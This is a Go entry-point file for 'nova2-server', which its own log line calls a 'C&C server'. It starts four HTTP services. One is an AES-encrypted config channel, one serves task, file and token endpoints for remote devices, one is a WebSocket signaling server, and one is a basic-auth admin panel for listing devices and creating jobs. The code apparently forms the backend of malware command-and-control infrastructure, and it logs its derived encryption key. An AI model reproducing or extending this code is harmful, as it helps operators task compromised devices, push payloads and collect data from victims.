package main

import (
	"context"
	"flag"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"nova2-server/internal/admin"
	"nova2-server/internal/config"
	"nova2-server/internal/crypto"
	"nova2-server/internal/middleware"
	"nova2-server/internal/service/dllpgd"
	"nova2-server/internal/service/h5"
	"nova2-server/internal/service/phantom"
	"nova2-server/internal/service/signaling"
	"nova2-server/internal/store"

	"github.com/go-chi/chi/v5"
	chiMw "github.com/go-chi/chi/v5/middleware"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
)

func main() {
	configPath := flag.String("config", "config.yaml", "path to config file")
	flag.Parse()

	// Load config
	cfg, err := config.Load(*configPath)
	if err != nil {
		log.Fatal().Err(err).Msg("load config")
	}

	// Setup logging
	level, _ := zerolog.ParseLevel(cfg.Logging.Level)
	zerolog.SetGlobalLevel(level)
	if cfg.Logging.Pretty {
		log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr, TimeFormat: time.RFC3339})
	}

	log.Info().Msg("starting nova2 C&C server")

	// Open database
	db, err := store.Open(cfg.Database.Path)
	if err != nil {
		log.Fatal().Err(err).Msg("open database")
	}
	defer db.Close()

	// Initialize repos
	deviceRepo := store.NewDeviceRepo(db)
	tokenRepo := store.NewTokenRepo(db)
	eventRepo := store.NewEventRepo(db)
	jobRepo := store.NewJobRepo(db)
	pluginRepo := store.NewPluginRepo(db)

	// Derive AES key
	aesKey := crypto.DeriveAESKey(cfg.Crypto.AESKeySeed)
	log.Info().Str("key_hex", string(aesKey)).Msg("AES key derived")

	// Initialize services
	dllpgdSvc := dllpgd.NewService(deviceRepo, eventRepo, pluginRepo)
	phantomSvc := phantom.NewService(deviceRepo, tokenRepo, pluginRepo)
	h5Svc := h5.NewService(deviceRepo, eventRepo, jobRepo, pluginRepo, tokenRepo)
	signalingSvc := signaling.NewService(deviceRepo, jobRepo)

	// Initialize handlers
	dllpgdHandler := dllpgd.NewHandler(dllpgdSvc)
	phantomHandler := phantom.NewHandler(phantomSvc, tokenRepo)
	h5Handler := h5.NewHandler(h5Svc, tokenRepo)
	signalingHandler := signaling.NewHandler(signalingSvc)
	adminHandler := admin.NewHandler(deviceRepo, eventRepo, jobRepo, pluginRepo, signalingSvc, cfg.Admin.Username, cfg.Admin.Password)

	// ─── Server 1: dllpgd (C&C Config) ───
	dllpgdRouter := chi.NewRouter()
	dllpgdRouter.Use(chiMw.RealIP)
	dllpgdRouter.Use(middleware.Logging(log.With().Str("service", "dllpgd").Logger()))
	dllpgdRouter.Use(middleware.Recovery)
	dllpgdRouter.Route("/api/v1/dllpgd", func(r chi.Router) {
		r.Use(middleware.DllpgdCodec(aesKey))
		r.Post("/getConfig", dllpgdHandler.GetConfig)
		r.Post("/updateEvent", dllpgdHandler.UpdateEvent)
		r.Post("/updateLog", dllpgdHandler.UpdateLog)
	})

	// ─── Server 2: phantom + h5 (C&C API) ───
	phantomRouter := chi.NewRouter()
	phantomRouter.Use(chiMw.RealIP)
	phantomRouter.Use(middleware.Logging(log.With().Str("service", "phantom").Logger()))
	phantomRouter.Use(middleware.Recovery)
	// phantom endpoints
	phantomRouter.Post("/phantom/token", phantomHandler.Token)
	phantomRouter.Post("/phantom/task", phantomHandler.Task)
	phantomRouter.Post("/phantom/file_version", phantomHandler.FileVersion)
	phantomRouter.Post("/phantom/file", phantomHandler.File)
	phantomRouter.Post("/phantom/done", phantomHandler.Done)
	// h5 endpoints
	phantomRouter.Post("/h5/js_file_for_signaling", h5Handler.JSFileForSignaling)
	phantomRouter.Post("/h5/get_job_by_offer", h5Handler.GetJobByOffer)
	phantomRouter.Post("/h5/upload_logs_v2", h5Handler.UploadLogs)
	phantomRouter.Post("/h5/report_events", h5Handler.ReportEvents)

	// ─── Server 3: signaling ───
	signalingRouter := chi.NewRouter()
	signalingRouter.Use(chiMw.RealIP)
	signalingRouter.Use(middleware.Logging(log.With().Str("service", "signaling").Logger()))
	signalingRouter.Use(middleware.Recovery)
	signalingRouter.Post("/signaling/checkPluginStart", signalingHandler.CheckPluginStart)
	signalingRouter.Post("/signaling/updateStatus", signalingHandler.UpdateStatus)
	signalingRouter.Get("/ws", signalingSvc.HandleWebSocket)

	// ─── Server 4: admin ───
	adminRouter := chi.NewRouter()
	adminRouter.Use(chiMw.RealIP)
	adminRouter.Use(middleware.Logging(log.With().Str("service", "admin").Logger()))
	adminRouter.Use(middleware.Recovery)
	// Static files (no auth)
	adminRouter.Handle("/static/*", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
	// Admin pages (with auth)
	adminRouter.Group(func(r chi.Router) {
		r.Use(adminHandler.BasicAuth)
		r.Get("/admin/", adminHandler.Dashboard)
		r.Get("/admin/devices", adminHandler.Devices)
		r.Get("/admin/devices/{deviceID}", adminHandler.DeviceDetail)
		r.Post("/admin/devices/{deviceID}/signaling", adminHandler.ToggleSignaling)
		r.Get("/admin/jobs", adminHandler.Jobs)
		r.Post("/admin/jobs/create", adminHandler.CreateJob)
		r.Get("/admin/events", adminHandler.Events)
		r.Get("/admin/webrtc", adminHandler.WebRTCControl)
		// API endpoints
		r.Get("/admin/api/devices", adminHandler.APIListDevices)
		r.Get("/admin/api/jobs", adminHandler.APIListJobs)
		r.Get("/admin/api/rooms", adminHandler.APIListRooms)
	})
	// Redirect root to admin
	adminRouter.Get("/", func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "/admin/", http.StatusFound)
	})

	// Start all servers
	servers := []*http.Server{
		{Addr: cfg.Server.DllpgdAddr, Handler: dllpgdRouter},
		{Addr: cfg.Server.PhantomAddr, Handler: phantomRouter},
		{Addr: cfg.Server.SignalingAddr, Handler: signalingRouter},
		{Addr: cfg.Server.AdminAddr, Handler: adminRouter},
	}

	names := []string{"dllpgd", "phantom", "signaling", "admin"}

	var wg sync.WaitGroup
	for i, srv := range servers {
		wg.Add(1)
		go func(s *http.Server, name string) {
			defer wg.Done()
			log.Info().Str("service", name).Str("addr", s.Addr).Msg("listening")
			if err := s.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				log.Fatal().Err(err).Str("service", name).Msg("listen failed")
			}
		}(srv, names[i])
	}

	// Graceful shutdown
	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	<-quit

	log.Info().Msg("shutting down...")

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	for i, srv := range servers {
		if err := srv.Shutdown(ctx); err != nil {
			log.Error().Err(err).Str("service", names[i]).Msg("shutdown error")
		}
	}

	wg.Wait()
	log.Info().Msg("server stopped")
}
